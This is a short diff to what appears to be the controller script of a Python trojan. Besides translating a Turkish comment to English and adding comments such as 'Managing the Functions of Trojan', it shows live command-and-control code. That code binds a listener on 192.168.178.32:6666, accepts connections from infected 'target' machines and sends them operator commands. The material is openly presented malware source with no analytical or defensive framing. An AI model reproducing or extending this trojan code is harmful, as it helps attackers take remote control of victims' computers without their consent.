@@ -45,8 +45,9 @@ def target_communication(target, ip):
         except Exception as e:
             print('Error: ' + e)
             break
-
+        # Managing the Functions of Trojan
         reliable_send(command, target)
+        # 
         if command == 'quit':
             break
         elif command == 'clear':
@@ -66,7 +67,7 @@ def target_communication(target, ip):
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # IP ve portu kendi ortamınıza göre ayarlayın.
+    # Setting IP and Port
     sock.bind(('192.168.178.32', 6666))
     print('[+] Listening For The Incoming Connections')
     sock.listen(5)
